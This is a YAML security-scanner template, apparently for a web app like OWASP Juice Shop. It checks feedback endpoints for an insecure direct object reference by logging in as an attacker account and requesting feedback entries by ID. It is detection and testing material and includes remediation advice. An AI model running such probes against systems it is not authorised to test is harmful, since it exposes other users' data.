id: feedback-idor
info:
  name: Feedback IDOR Vulnerability
  severity: medium
  description: Detects IDOR on feedback endpoints
  tags:
    - idor
    - access-control

variables:
  attacker_email: "{{ATTACKER_EMAIL}}"
  attacker_password: "{{ATTACKER_PASSWORD}}"
  victim_email: "{{VICTIM_EMAIL}}"
  victim_password: "{{VICTIM_PASSWORD}}"

requests:
  - name: Attacker login
    method: POST
    path: /rest/user/login
    headers:
      Content-Type: application/json
    body: '{"email": "{{attacker_email}}", "password": "{{attacker_password}}"}'
    extractors:
      - type: json
        name: attacker_token
        selector: "$.authentication.token"

  - name: Get feedback list
    method: GET
    path: /api/Feedbacks/
    headers:
      Authorization: "Bearer {{attacker_token}}"
    extractors:
      - type: json
        name: feedback_id
        selector: "$.data.0.id"

  - name: Access feedback by ID
    method: GET
    path: /api/Feedbacks/{{feedback_id}}
    headers:
      Authorization: "Bearer {{attacker_token}}"
    matchers:
      - type: status
        values: [200]
      - type: json
        selector: "$.data"
        condition: exists
    on_match:
      vulnerability: INSECURE_DIRECT_OBJECT_REFERENCE
      message: Can access other users feedback by sequential ID
      remediation: Verify ownership before allowing access to user-generated content
